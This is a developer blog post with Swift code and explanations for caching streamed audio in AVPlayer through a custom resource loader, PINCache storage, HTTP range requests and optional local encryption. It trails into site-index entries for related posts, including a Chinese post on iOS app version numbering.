CryptoKitclass AssetDataContentInformation: NSObject, NSCoding { @objc var contentLength: Int64 = 0 @objc var contentType: String = \"\" @objc var isByteRangeAccessSupported: Bool = false func encode(with coder: NSCoder) { coder.encode(self.contentLength, forKey: #keyPath(AssetDataContentInformation.contentLength)) coder.encode(self.contentType, forKey: #keyPath(AssetDataContentInformation.contentType)) coder.encode(self.isByteRangeAccessSupported, forKey: #keyPath(AssetDataContentInformation.isByteRangeAccessSupported)) } override init() { super.init() } required init?(coder: NSCoder) { super.init() self.contentLength = coder.decodeInt64(forKey: #keyPath(AssetDataContentInformation.contentLength)) self.contentType = coder.decodeObject(forKey: #keyPath(AssetDataContentInformation.contentType)) as? String ?? \"\" self.isByteRangeAccessSupported = coder.decodeObject(forKey: #keyPath(AssetDataContentInformation.isByteRangeAccessSupported)) as? Bool ?? false }}class AssetData: NSObject, NSCoding { @objc var contentInformation: AssetDataContentInformation = AssetDataContentInformation() @objc var mediaData: Data = Data() override init() { super.init() } func encode(with coder: NSCoder) { coder.encode(self.contentInformation, forKey: #keyPath(AssetData.contentInformation)) coder.encode(self.mediaData, forKey: #keyPath(AssetData.mediaData)) } required init?(coder: NSCoder) { super.init() self.contentInformation = coder.decodeObject(forKey: #keyPath(AssetData.contentInformation)) as? AssetDataContentInformation ?? AssetDataContentInformation() self.mediaData = coder.decodeObject(forKey: #keyPath(AssetData.mediaData)) as? Data ?? Data() }}AssetData stores: contentInformation: AssetDataContentInformationAssetDataContentInformation: stores whether range requests are supported (isByteRangeAccessSupported), the total length of the resource (contentLength), and the file type (contentType). mediaData: Original audio Data (this may cause OOM if the file is too large)PINCacheAssetDataManagerEncapsulating the logic for storing and retrieving data in PINCache.```swiftimport PINCacheimport Foundationprotocol AssetDataManager: NSObject { func retrieveAssetData() -&gt; AssetData? func saveContentInformation(_ contentInformation: AssetDataContentInformation) func saveDownloadedData(_ data: Data, offset: Int) func mergeDownloadedDataIfIsContinuted(from: Data, with: Data, offset: Int) -&gt; Data?}extension AssetDataManager { func mergeDownloadedDataIfIsContinuted(from: Data, with: Data, offset: Int) -&gt; Data? { if offset &lt;= from.count &amp;&amp; (offset + with.count) &gt; from.count { let start = from.count - offset var data = from data.append(with.subdata(in: start..&lt;with.count)) return data } return nil }}//class PINCacheAssetDataManager: NSObject, AssetDataManager { static let Cache: PINCache = PINCache(name: \"ResourceLoader\") let cacheKey: String init(cacheKey: String) { self.cacheKey = cacheKey super.init() } func saveContentInformation(_ contentInformation: AssetDataContentInformation) { let assetData = AssetData() assetData.contentInformation = contentInformation PINCacheAssetDataManager.Cache.setObjectAsync(assetData, forKey: cacheKey, completion: nil) } func saveDownloadedData(_ data: Data, offset: Int) { guard let assetData = self.retrieveAssetData() else { return } if let mediaData = self.mergeDownloadedDataIfIsContinuted(from: assetData.mediaData, with: data, offset: offset) { assetData.mediaData = mediaData PINCacheAssetDataManager.Cache.setObjectAsync(assetData, forKey: cacheKey, completion: nil) } } func retrieveAssetData() -&gt; AssetData? { guard let assetData = PINCacheAssetDataManager.Cache.object(forKey: cacheKey) as? AssetData else { return nil } return assetData }}Here, the protocol is extracted because in the future, we may use other storage methods instead of PINCache, allowing other programs to rely on the protocol rather than the class instance. ⚠️ mergeDownloadedDataIfIsContinuted This method is extremely important.For linear playback, you can simply append new data to the cached data. However, the reality is much more complex; users might play from range 0-100 and then directly seek to range 200-500. How to merge the existing 0-100 data with the new 200-500 data is a significant challenge. ⚠️ Issues with data merging can lead to terrifying playback glitches…The answer here is that we do not handle non-continuous data; since our project only deals with audio and the files are only a few MB (≤ 10MB), we decided not to implement it due to development costs. I only handle merging continuous data (for example, if we already have 0-100 and the new data is 75-200, the merge results in 0-200; if the new data is 150-200, I will ignore it and not merge).If we want to consider non-continuous merging, we would need to use other methods for storage (to identify the missing parts); during requests, we would also need to query which segments require network requests and which segments can be retrieved locally. Implementing this would be very complex.Image source: Design and Implementation of iOS AVPlayer Video CachingCachingAVURLAssetAVURLAsset weakly holds the ResourceLoader delegate, so it is recommended to create your own AVURLAsset class that inherits from AVURLAsset, internally creating, assigning, and holding the ResourceLoader, allowing it to follow the lifecycle of AVURLAsset. Additionally, you can store the original URL, cache key, and other information.class CachingAVURLAsset: AVURLAsset { static let customScheme = \"cacheable\" let originalURL: URL private var _resourceLoader: ResourceLoader? var cacheKey: String { return self.url.lastPathComponent } static func isSchemeSupport(_ url: URL) -&gt; Bool { guard let components = URLComponents(url: url, resolvingAgainstBaseURL: false) else { return false } return [\"http\", \"https\"].contains(components.scheme) } override init(url URL: URL, options: [String: Any]? = nil) { self.originalURL = URL guard var components = URLComponents(url: URL, resolvingAgainstBaseURL: false) else { super.init(url: URL, options: options) return } components.scheme = CachingAVURLAsset.customScheme guard let url = components.url else { super.init(url: URL, options: options) return } super.init(url: url, options: options) let resourceLoader = ResourceLoader(asset: self) self.resourceLoader.setDelegate(resourceLoader, queue: resourceLoader.loaderQueue) self._resourceLoader = resourceLoader }}Usage:if CachingAVURLAsset.isSchemeSupport(url) { let asset = CachingAVURLAsset(url: url) let avplayer = AVPlayer(asset) avplayer.play()}The isSchemeSupport() function is used to determine if the URL supports our Resource Loader (excluding file://).originalURL stores the original resource URL.cacheKey stores the cache key for this resource, which is directly set to the file name.Please adjust the cacheKey according to real-world scenarios. If the file name is not hashed and may be duplicated, it is recommended to hash it first to avoid collisions; if you want to hash the entire URL as the key, be cautious about whether the URL may change (e.g., if using a CDN).You can use md5…sha… For iOS ≥ 13, you can directly use Apple’s CryptoKit, otherwise, you can find alternatives on GitHub!ResourceLoaderRequestimport Foundationimport CoreServicesprotocol ResourceLoaderRequestDelegate: AnyObject { func dataRequestDidReceive(_ resourceLoaderRequest: ResourceLoaderRequest, _ data: Data) func dataRequestDidComplete(_ resourceLoaderRequest: ResourceLoaderRequest, _ error: Error?, _ downloadedData: Data) func contentInformationDidComplete(_ resourceLoaderRequest: ResourceLoaderRequest, _ result: Result&lt;AssetDataContentInformation, Error&gt;)}class ResourceLoaderRequest: NSObject, URLSessionDataDelegate { struct RequestRange { var start: Int64 var end: RequestRangeEnd enum RequestRangeEnd { case requestTo(Int64) case requestToEnd } } enum RequestType { case contentInformation case dataRequest } struct ResponseUnExpectedError: Error { } private let loaderQueue: DispatchQueue let originalURL: URL let type: RequestType private var session: URLSession? private var dataTask: URLSessionDataTask? private var assetDataManager: AssetDataManager? private(set) var requestRange: RequestRange? private(set) var response: URLResponse? private(set) var downloadedData: Data = Data() private(set) var isCancelled: Bool = false { didSet { if isCancelled { self.dataTask?.cancel() self.session?.invalidateAndCancel() } } } private(set) var isFinished: Bool = false { didSet { if isFinished { self.session?.finishTasksAndInvalidate() } } } weak var delegate: ResourceLoaderRequestDelegate? init(originalURL: URL, type: RequestType, loaderQueue: DispatchQueue, assetDataManager: AssetDataManager?) { self.originalURL = originalURL self.type = type self.loaderQueue = loaderQueue self.assetDataManager = assetDataManager super.init() } func start(requestRange: RequestRange) { guard isCancelled == false, isFinished == false else { return } self.loaderQueue.async { [weak self] in guard let self = self else { return } var request = URLRequest(url: self.originalURL) self.requestRange = requestRange let start = String(requestRange.start) let end: String switch requestRange.end { case .requestTo(let rangeEnd): end = String(rangeEnd) case .requestToEnd: end = \"\" } let rangeHeader = \"bytes=\\(start)-\\(end)\" request.setValue(rangeHeader, forHTTPHeaderField: \"Range\") let session = URLSession(configuration: .default, delegate: self, delegateQueue: nil) self.session = session let dataTask = session.dataTask(with: request) self.dataTask = dataTask dataTask.resume() } } func cancel() { self.isCancelled = true } func urlSession(_ session: URLSession, dataTask: URLSessionDataTask, didReceive data: Data) { guard self.type == .dataRequest else { return } self.loaderQueue.async { self.delegate?.dataRequestDidReceive(self, data) self.downloadedData.append(data) } } func urlSession(_ session: URLSession, dataTask: URLSessionDataTask, didReceive response: URLResponse, completionHandler: @escaping (URLSession.ResponseDisposition) -&gt; Void) { self.response = response completionHandler(.allow) } func urlSession(_ session: URLSession, task: URLSessionTask, didCompleteWithError error: Error?) { self.isFinished = true self.loaderQueue.async { if self.type == .contentInformation { guard error == nil, let response = self.response as? HTTPURLResponse else { let responseError = error ?? ResponseUnExpectedError() self.delegate?.contentInformationDidComplete(self, .failure(responseError)) return } let contentInformation = AssetDataContentInformation() if let rangeString = response.allHeaderFields[\"Content-Range\"] as? String, let bytesString = rangeString.split(separator: \"/\").map({String($0)}).last, let bytes = Int64(bytesString) { contentInformation.contentLength = bytes } if let mimeType = response.mimeType, let contentType = UTTypeCreatePreferredIdentifierForTag(kUTTagClassMIMEType, mimeType as CFString, nil)?.takeRetainedValue() { contentInformation.contentType = contentType as String } if let value = response.allHeaderFields[\"Accept-Ranges\"] as? String, value == \"bytes\" { contentInformation.isByteRangeAccessSupported = true } else { contentInformation.isByteRangeAccessSupported = false } self.assetDataManager?.saveContentInformation(contentInformation) self.delegate?.contentInformationDidComplete(self, .success(contentInformation)) } else { if let offset = self.requestRange?.start, self.downloadedData.count &gt; 0 { self.assetDataManager?.saveDownloadedData(self.downloadedData, offset: Int(offset)) } self.delegate?.dataRequestDidComplete(self, error, self.downloadedData) } } }}This encapsulates the remote request, primarily serving the data requests initiated by the ResourceLoader.RequestType: Used to distinguish whether this request is for the first file information request (contentInformation) or for data request (dataRequest).RequestRange: The range of the request, where the end can specify where to request (requestTo(Int64)) or all (requestToEnd).File information can be obtained from:func urlSession(_ session: URLSession, dataTask: URLSessionDataTask, didReceive response: URLResponse, completionHandler: @escaping (URLSession.ResponseDisposition) -&gt; Void)Additionally, note that if you want to change to HEAD requests, you won’t enter this method and will need to handle it differently. isByteRangeAccessSupported: Checks if the response header has Accept-Ranges == bytes contentType: The file type information required by the player, in the format of a uniform type identifier, not audio/mpeg, but written as public.mp3 contentLength: Looks at the response header’s Content-Range: bytes 0–1/ total length of the resource ⚠️ Be cautious of the case sensitivity of the format provided by the server; it may not always be written as Accept-Ranges/Content-Range; some servers may use lowercase accept-ranges, Accept-ranges…Supplement: If you want to consider case sensitivity, you can write an HTTPURLResponse extensionimport CoreServicesextension HTTPURLResponse { func parseContentLengthFromContentRange() -&gt; Int64? { let contentRangeKeys: [String] = [ \"Content-Range\", \"content-range\", \"Content-range\", \"content-Range\" ] var rangeString: String? for key in contentRangeKeys { if let value = self.allHeaderFields[key] as? String { rangeString = value break } } guard let rangeString = rangeString, let contentLengthString = rangeString.split(separator: \"/\").map({String($0)}).last, let contentLength = Int64(contentLengthString) else { return nil } return contentLength } func parseAcceptRanges() -&gt; Bool? { let contentRangeKeys: [String] = [ \"Accept-Ranges\", \"accept-ranges\", \"Accept-ranges\", \"accept-Ranges\" ] var rangeString: String? for key in contentRangeKeys { if let value = self.allHeaderFields[key] as? String { rangeString = value break } } guard let rangeString = rangeString else { return nil } return rangeString == \"bytes\" || rangeString == \"Bytes\" } func mimeTypeUTI() -&gt; String? { guard let mimeType = self.mimeType, let contentType = UTTypeCreatePreferredIdentifierForTag(kUTTagClassMIMEType, mimeType as CFString, nil)?.takeRetainedValue() else { return nil } return contentType as String }}Usage: contentLength = response.parseContentLengthFromContentRange() isByteRangeAccessSupported = response.parseAcceptRanges() contentType = response.mimeTypeUTI()func urlSession(_ session: URLSession, dataTask: URLSessionDataTask, didReceive data: Data)As mentioned in the introductory knowledge, this method will continuously receive the downloaded data, so it will keep entering this method, obtaining data in segments; we will append it into downloadedData for storage.func urlSession(_ session: URLSession, task: URLSessionTask, didCompleteWithError error: Error?)This method will be called when the task is canceled or completed, where we will save the downloaded data.As mentioned in the introductory knowledge, the cancel mechanism is that the player will initiate a cancel request once it has enough data; therefore, when entering this method, the actual error will be NSURLErrorCancelled, so regardless of the error, we will attempt to save the data we have obtained. ⚠️ Since URLSession requests data in parallel, please keep operations within DispatchQueue to avoid data corruption (data corruption can also lead to terrifying playback glitches). ️️⚠️ If neither finishTasksAndInvalidate nor invalidateAndCancel is called, URLSession will strongly hold the object, causing a memory leak; therefore, regardless of whether it is canceled or completed, we must call these methods to release the request at the end of the task. ️️⚠️️️️️️️️️️️ If you are concerned about downloadedData causing an OOM, you can save it locally in didReceive Data.ResourceLoaderimport AVFoundationimport Foundationclass ResourceLoader: NSObject { let loaderQueue = DispatchQueue(label: \"li.zhgchg.resourceLoader.queue\") private var requests: [AVAssetResourceLoadingRequest: ResourceLoaderRequest] = [:] private let cacheKey: String private let originalURL: URL init(asset: CachingAVURLAsset) { self.cacheKey = asset.cacheKey self.originalURL = asset.originalURL super.init() } deinit { self.requests.forEach { (request) in request.value.cancel() } }}extension ResourceLoader: AVAssetResourceLoaderDelegate { func resourceLoader(_ resourceLoader: AVAssetResourceLoader, shouldWaitForLoadingOfRequestedResource loadingRequest: AVAssetResourceLoadingRequest) -&gt; Bool { let type = ResourceLoader.resourceLoaderRequestType(loadingRequest) let assetDataManager = PINCacheAssetDataManager(cacheKey: self.cacheKey) if let assetData = assetDataManager.retrieveAssetData() { if type == .contentInformation { loadingRequest.contentInformationRequest?.contentLength = assetData.contentInformation.contentLength loadingRequest.contentInformationRequest?.contentType = assetData.contentInformation.contentType loadingRequest.contentInformationRequest?.isByteRangeAccessSupported = assetData.contentInformation.isByteRangeAccessSupported loadingRequest.finishLoading() return true } else { let range = ResourceLoader.resourceLoaderRequestRange(type, loadingRequest) if assetData.mediaData.count &gt; 0 { let end: Int64 switch range.end { case .requestTo(let rangeEnd): end = rangeEnd case .requestToEnd: end = assetData.contentInformation.contentLength } if assetData.mediaData.count &gt;= end { let subData = assetData.mediaData.subdata(in: Int(range.start)..&lt;Int(end)) loadingRequest.dataRequest?.respond(with: subData) loadingRequest.finishLoading() return true } else if range.start &lt;= assetData.mediaData.count { // has cache data...but not enough let subEnd = (assetData.mediaData.count &gt; end) ? Int((end)) : (assetData.mediaData.count) let subData = assetData.mediaData.subdata(in: Int(range.start)..&lt;subEnd) loadingRequest.dataRequest?.respond(with: subData) } } } } let range = ResourceLoader.resourceLoaderRequestRange(type, loadingRequest) let resourceLoaderRequest = ResourceLoaderRequest(originalURL: self.originalURL, type: type, loaderQueue: self.loaderQueue, assetDataManager: assetDataManager) resourceLoaderRequest.delegate = self self.requests[loadingRequest]?.cancel() self.requests[loadingRequest] = resourceLoaderRequest resourceLoaderRequest.start(requestRange: range) return true } func resourceLoader(_ resourceLoader: AVAssetResourceLoader, didCancel loadingRequest: AVAssetResourceLoadingRequest) { guard let resourceLoaderRequest = self.requests[loadingRequest] else { return } resourceLoaderRequest.cancel() requests.removeValue(forKey: loadingRequest) }}extension ResourceLoader: ResourceLoaderRequestDelegate { func contentInformationDidComplete(_ resourceLoaderRequest: ResourceLoaderRequest, _ result: Result&lt;AssetDataContentInformation, Error&gt;) { guard let loadingRequest = self.requests.first(where: { $0.value == resourceLoaderRequest })?.key else { return } switch result { case .success(let contentInformation): loadingRequest.contentInformationRequest?.contentType = contentInformation.contentType loadingRequest.contentInformationRequest?.contentLength = contentInformation.contentLength loadingRequest.contentInformationRequest?.isByteRangeAccessSupported = contentInformation.isByteRangeAccessSupported loadingRequest.finishLoading() case .failure(let error): loadingRequest.finishLoading(with: error) } } func dataRequestDidReceive(_ resourceLoaderRequest: ResourceLoaderRequest, _ data: Data) { guard let loadingRequest = self.requests.first(where: { $0.value == resourceLoaderRequest })?.key else { return } loadingRequest.dataRequest?.respond(with: data) } func dataRequestDidComplete(_ resourceLoaderRequest: ResourceLoaderRequest, _ error: Error?, _ downloadedData: Data) { guard let loadingRequest = self.requests.first(where: { $0.value == resourceLoaderRequest })?.key else { return } loadingRequest.finishLoading(with: error) requests.removeValue(forKey: loadingRequest) }}extension ResourceLoader { static func resourceLoaderRequestType(_ loadingRequest: AVAssetResourceLoadingRequest) -&gt; ResourceLoaderRequest.RequestType { if let _ = loadingRequest.contentInformationRequest { return .contentInformation } else { return .dataRequest } } static func resourceLoaderRequestRange(_ type: ResourceLoaderRequest.RequestType, _ loadingRequest: AVAssetResourceLoadingRequest) -&gt; ResourceLoaderRequest.RequestRange { if type == .contentInformation { return ResourceLoaderRequest.RequestRange(start: 0, end: .requestTo(1)) } else { if loadingRequest.dataRequest?.requestsAllDataToEndOfResource == true { let lowerBound = loadingRequest.dataRequest?.currentOffset ?? 0 return ResourceLoaderRequest.RequestRange(start: lowerBound, end: .requestToEnd) } else { let lowerBound = loadingRequest.dataRequest?.currentOffset ?? 0 let length = Int64(loadingRequest.dataRequest?.requestedLength ?? 1) let upperBound = lowerBound + length return ResourceLoaderRequest.RequestRange(start: lowerBound, end: .requestTo(upperBound)) } } }}If loadingRequest.contentInformationRequest != nil, it indicates that this is the first request, and the player is asking for file information.When requesting file information, we need to provide these three pieces of information: loadingRequest.contentInformationRequest?.isByteRangeAccessSupported: Indicates whether range access for data is supported. loadingRequest.contentInformationRequest?.contentType: The uniform type identifier. loadingRequest.contentInformationRequest?.contentLength: The total length of the file as Int64.loadingRequest.dataRequest?.requestedOffset can be used to obtain the starting offset of the requested range.loadingRequest.dataRequest?.requestedLength can be used to obtain the length of the requested range.If loadingRequest.dataRequest?.requestsAllDataToEndOfResource == true, it means that regardless of the requested range length, the entire resource will be fetched.loadingRequest.dataRequest?.respond(with: Data) returns the loaded data to the player.loadingRequest.dataRequest?.currentOffset can be used to obtain the current data offset, and after calling dataRequest?.respond(with: Data), the currentOffset will be updated accordingly.loadingRequest.finishLoading() indicates that all data has been loaded and informs the player.func resourceLoader(_ resourceLoader: AVAssetResourceLoader, shouldWaitForLoadingOfRequestedResource loadingRequest: AVAssetResourceLoadingRequest) -&gt; BoolWhen the player requests data, we first check if there is any data in the local cache. If there is, we return it; if only partial data is available, we return that portion. For example, if we have data from 0–100 and the player requests 0–200, we will return 0–100 first.If there is no local cache and the returned data is insufficient, a ResourceLoaderRequest will be initiated to fetch data from the network.func resourceLoader(_ resourceLoader: AVAssetResourceLoader, didCancel loadingRequest: AVAssetResourceLoadingRequest)When the player cancels a request, we cancel the ResourceLoaderRequest. You may have noticed that the offset in resourceLoaderRequestRange is based on currentOffset, because we will first respond with the already downloaded data from the local cache using dataRequest?.respond(with: Data); thus, we can directly look at the updated offset.func private var requests: [AVAssetResourceLoadingRequest: ResourceLoaderRequest] = [:] ⚠️ In some examples, currentRequest: ResourceLoaderRequest is used to store requests, which can lead to issues. If the current request is still being processed and the user seeks, the old request may be canceled while a new one is initiated. Since these actions may not occur in order, using a Dictionary for storage is safer! ⚠️ Ensure all operations are performed on the same DispatchQueue to prevent data corruption.Cancel all ongoing requests when deinitializingThe Resource Loader deinitialization indicates that the AVURLAsset is being deinitialized, meaning the player no longer needs this resource. Therefore, we can cancel any ongoing requests for data, while the already loaded data will still be written to the cache.Supplement and AcknowledgmentsThanks to Lex Tang for the guidance.Thanks to my granddaughter for providing development advice and support.This article only addresses small music filesLarge video files may encounter Out Of Memory issues in downloadedData or AssetData/PINCacheAssetDataManager.As mentioned earlier, to resolve this issue, please use fileHandler seek read/write to operate local cache reading and writing (instead of AssetData/PINCacheAssetDataManager); or check if there are any GitHub projects available for large data write/read to file.AVQueuePlayer cancels ongoing downloads when switching playback itemsAs stated in the previous knowledge, when changing the playback target, a cancel will not be initiated. If it were AVPlayer, it would trigger AVURLAsset deinitialization, thus interrupting the download. However, AVQueuePlayer does not do this, as it remains in the queue; it simply changes the playback target to the next song.The only approach here is to listen for notifications of playback target changes and cancel the previous AVURLAsset loading upon receiving the notification.asset.cancelLoading()Audio data encryption and decryptionAudio encryption and decryption can be performed in ResourceLoaderRequest when obtaining data, and during storage, it can be done in AssetData’s encode/decode methods for the locally stored data.CryptoKit SHA usage example:class AssetData: NSObject, NSCoding { static let encryptionKeyString = \"encryptionKeyExzhgchgli\" ... func encode(with coder: NSCoder) { coder.encode(self.contentInformation, forKey: #keyPath(AssetData.contentInformation)) if #available(iOS 13.0, *), let encryptionData = try? ChaChaPoly.seal(self.mediaData, using: AssetData.encryptionKey).combined { coder.encode(encryptionData, forKey: #keyPath(AssetData.mediaData)) } else { // } } required init?(coder: NSCoder) { super.init() ... if let mediaData = coder.decodeObject(forKey: #keyPath(AssetData.mediaData)) as? Data { if #available(iOS 13.0, *), let sealedBox = try? ChaChaPoly.SealedBox(combined: mediaData), let decryptedData = try? ChaChaPoly.open(sealedBox, using: AssetData.encryptionKey) { self.mediaData = decryptedData } else { // } } else { // } }}PINCache related operationsPINCache includes PINMemoryCache and PINDiskCache, which handle reading from files to memory or writing from memory to files. We only need to operate on PINCache.To find the cache file location in the simulator:Use NSHomeDirectory() to obtain the simulator file path.In Finder, go to -&gt; Paste the path.In Library -&gt; Caches -&gt; com.pinterest.PINDiskCache.ResourceLoader, you will find the directory we created for the Resource Loader Cache.PINCache(name: “ResourceLoader”) specifies the directory name.You can also specify rootPath, allowing the directory to be moved under Documents (to avoid being cleared by the system).Setting the maximum limit for PINCache: PINCacheAssetDataManager.Cache.diskCache.byteCount = 300 * 1024 * 1024 // max: 300mb PINCacheAssetDataManager.Cache.diskCache.byteLimit = 90 * 60 * 60 * 24 // 90 daysThe system default limit.Setting it to 0 means files will not be deleted proactively.PostscriptInitially, I underestimated the difficulty of this feature, thinking it could be handled quickly; however, I faced many challenges and spent an additional two weeks addressing data storage issues. Nevertheless, I now have a thorough understanding of the entire Resource Loader operation mechanism, GCD, and Data.ReferencesFinally, here are some reference materials for researching how to implement this: Design and Implementation of iOS AVPlayer Video Caching - Discusses the principles only. Implementing Audio and Video Playback and Caching Based on AVPlayer, Supporting Synchronized Video Output [ SZAVPlayer ] - Includes code (very complete but complex). CachingPlayerItem - (Simple implementation, easier to understand but incomplete). Possibly the best AVPlayer audio and video caching solution AVAssetResourceLoaderDelegate. Swift version of Douyin [ Github ] - (An interesting project that replicates the Douyin app; it also uses Resource Loader). Exploring iOS HLS Cache Implementation Methods.Extensions DLCachePlayer (Objective-C version).If you have any questions or suggestions, feel free to contact me.```This article was first published on Medium ➡️ Click HereAutomatically converted and synchronized using ZMediumToMarkdown and Medium-to-jekyll-starter.Improve this page on Github.Follow Me on Medium 1K+ Followers 5,099 Total Views Last Statistics Date: 2025-08-15 | 4,896 Views on Medium." }, { "title": "AVPlayer 邊播邊 Cache 實戰", "url": "/posts/avplayer-%E9%82%8A%E6%92%AD%E9%82%8A-cache-%E5%AF%A6%E6%88%B0-ee47f8f1e2d2/", "categories": "", "tags": "ios, ios-app-development, cache, avplayer, music-player", "date": "2021-01-05 22:27:52 +0800", "snippet": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.[舊]AVPlayer 邊播邊 Cache 實戰摸清 AVPlayer/AVQueuePlayer with AVURLAsset 實作 AVAssetResourceLoaderDelegate 的脈絡[2021–01–31...", "content": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.[舊]AVPlayer 邊播邊 Cache 實戰摸清 AVPlayer/AVQueuePlayer with AVURLAsset 實作 AVAssetResourceLoaderDelegate 的脈絡[2021–01–31] 文章公告：文章編修完成在此要先對所有已讀原本文章的朋友深深一鞠躬道歉，因為自己的魯莽沒有徹底研究完成就發表文章；導致部分內容有誤、浪費您寶貴的時間。目前已從頭把脈絡梳理完成，重新撰寫了篇文章；內含完整專案程式共大家參考，謝謝！變更內容： 約 30%新增內容： 約 60% AVPlayer 實踐本地 Cache 功能大全 點我查看本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 1,310 Total Views Last Statistics Date: 2025-08-15 | 1,165 Views on Medium." }, { "title": "AVPlayer Streaming and Caching Practical Guide", "url": "/posts/en/avplayer-streaming-and-caching-practical-guide-ee47f8f1e2d2/", "categories": "", "tags": "ios, ios-app-development, cache, avplayer, music-player", "date": "2021-01-05 22:27:52 +0800", "snippet": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版[Old] AVPlayer Streaming and Caching Practical GuideUnderstanding the context of imp...", "content": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版[Old] AVPlayer Streaming and Caching Practical GuideUnderstanding the context of implementing AVPlayer/AVQueuePlayer with AVURLAsset and AVAssetResourceLoaderDelegate.[2021–01–31] Article Announcement: Article Revision CompletedI would like to sincerely apologize to all friends who have read the original article, as my recklessness led me to publish it without thorough research; this resulted in some inaccuracies and wasted your valuable time.I have now completely reorganized the context from scratch and rewritten the article; it includes a complete project code for everyone to reference. Thank you!Changes Made: Approximately 30%New Content: Approximately 60% Comprehensive Guide to AVPlayer Local Caching Click HereThis article was first published on Medium ➡️ Click HereAutomatically converted and synchronized using ZMediumToMarkdown and Medium-to-jekyll-starter.Improve this page on Github.Follow Me on Medium 1K+ Followers 1,310 Total Views Last Statistics Date: 2025-08-15 | 1,165 Views on Medium." }, { "title": "iOS APP 版本號那些事", "url": "/posts/zrealm-dev/ios-app-%E7%89%88%E6%9C%AC%E8%99%9F%E9%82%A3%E4%BA%9B%E4%BA%8B-c4d7c2ce5a8d/", "categories": "ZRealm Dev.", "tags": "ios, ios-app-development, software-engineering, version-control, software-development", "date": "2020-12-17 22:33:08 +0800", "snippet": "iOS APP 版本號那些事版本號規則及判斷比較解決方案Photo by James Yarema前言所有 iOS APP 開發者都會碰到的兩個數字，Version Number 和 Build Number；最近剛好遇到需求跟版本號有關，要做版本號判斷邀請使用者評價 APP，順便挖掘了一下關於版本號的事；文末也會附上我的版本號判斷解決大全。XCode Help語意化版本 x.y.z首先介紹...", "content": "iOS APP 版本號那些事版本號規則及判斷比較解決方案Photo by James Yarema前言所有 iOS APP 開發者都會碰到的兩個數字，Version Number 和 Build Number；最近剛好遇到需求跟版本號有關，要做版本號判斷邀請使用者評價 APP，順便挖掘了一下關於版本號的事；文末也會附上我的版本號判斷解決大全。XCode Help語意化版本 x.y.z首先介紹「 語意化版本 」這份規範，主要是要解決軟體相依及軟體管理上的問題，如我們很常在使用的 Cocoapods ；假設我今天使用 Moya 4.0，Moya 4.0 使用並依賴 Alamofire 2.0.0，如果今天 Alamofire 有更新了，可能是新功能、可能是修復問題、可能是整個架構重做(不相容舊版)；這時候如果對於版本號沒有一個公共共識規範，將會變得一團亂，因為你不知道哪個版本是相容的、可更新的。語意化版本由三個部分組成： x.y.z x: 主版號 (major)：當你做了不相容的 API 修改 y: 次版號 (minor)：當你做了向下相容的功能性新增 z: 修訂號 (patch)：當你做了向下相容的問題修正通用規則： 必須為非負的整數 不可補零 0.y.z 開頭為開發初始階段，不應該用於正式版版號 以數值遞增比較方式： 先比 主版號，主版號 等於時 再比 次版號，次版號 等於時 再比 修訂號。 ex: 1.0.0 &lt; 2.0.0 &lt; 2.1.0 &lt; 2.1.1另外還可在修訂號之後加入「先行版號資訊 (ex: 1.0.1-alpha)」或「版本編譯資訊 (ex: 1.0.0-alpha+001)」但 iOS APP 版號並不允許這兩個格式上傳至 App Store，所以這邊就不做贅述，詳細可參考「 語意化版本 」。✅：1.0.1, 1.0.0, 5.6.7❌：01.5.6, a1.2.3, 2.005.6實際使用關於實際使用在 iOS APP 版本控制上，因為我們僅作為 Release APP 版本的標記，不存在與其他 APP、軟體相依問題；所以在實際使用上的定義就因應各團隊自行定義，以下僅為個人想法： x: 主版號 (major)：有重大更新時（多個頁面介面翻新、主打功能上線） y: 次版號 (minor)：現有功能優化、補強時（大功能下的小功能新增） z: 修訂號 (patch)：修正目前版本的 bug時一般如果是緊急修復(Hot Fix)才會動到修訂號，正常狀況下都為 0；如果有新的版本上線可以將它歸回 0。 EX: 第一版上線(1.0.0) -&gt; 補強第一版的功能 (1.1.0) -&gt; 發現有問題要修復 (1.1.1) -&gt; 再次發現有問題 (1.1.2) -&gt; 繼續補強第一版的功能 (1.2.0) -&gt; 全新改版 (2.0.0) -&gt; 發現有問題要修復 (2.0.1) … 以此類推Version Number vs. Build NumberVersion Number (APP 版本號) App Store、外部識別用 Property List Key: CFBundleShortVersionString 內容僅能由數字和「.」組成 官方也是建議使用語意化版本 x.y.z 格式 2020121701、2.0、2.0.0.1 都可(下面會有總表統計 App Store 上 App 版本號的命名方式) 不可超過 18 個字元 格式不合可以 build &amp; run 但無法打包上傳到 App Store 僅能往上遞增、不能重複、不能下降 一般習慣使用語意化版本 x.y.z 或 x.y。Build Number 內部開發過程、階段識別使用，不會公開給使用者 打包上傳到 App Store 識別使用（相同 build number 無法重複打包上傳） Property List Key: CFBundleVersion 內容僅能由數字和「.」組成 官方也是建議使用語意化版本 x.y.z 格式 1、2020121701、2.0、2.0.0.1 都可 不可超過 18 個字元 格式不合可以 build &amp; run 但無法打包上傳到 App Store 同個 APP 版本號下不能重複，反之不同APP 版本號可以重複ex: 1.0.0 build: 1.0.0, 1.1.0 build: 1.0.0 ✅ 一般習慣使用日期、number（每個新版本都從 0 開始），並搭配 CI/fastlane 自動在打包時遞增 build number。稍微統計了一下排行版上 app 的版本號格式，如上圖。一般還是以 x.y.z 為主。版本號比較及判斷方式有時候我們會需要使用版本進行判斷，例如：低於 x.y.z 版本則跳強制更新、等於某個版本跳邀請評價，這時候就需要能比較兩個版本字串的功能。簡易方式let version = \"1.0.0\"print(version.compare(\"1.0.0\", options: .numeric) == .orderedSame) // true 1.0.0 = 1.0.0print(version.compare(\"1.22.0\", options: .numeric) == .orderedAscending) // true 1.0.0 &lt; 1.22.0print(version.compare(\"0.0.9\", options: .numeric) == .orderedDescending) // true 1.0.0 &gt; 0.0.9print(version.compare(\"2\", options: .numeric) == .orderedAscending) // true 1.0.0 &lt; 2也可以寫 String Extension：extension String { func versionCompare(_ otherVersion: String) -&gt; ComparisonResult { return self.compare(otherVersion, options: .numeric) }}⚠️但需注意若遇到格式不同要判斷相同是會有誤：let version = \"1.0.0\"version.compare(\"1\", options: .numeric) 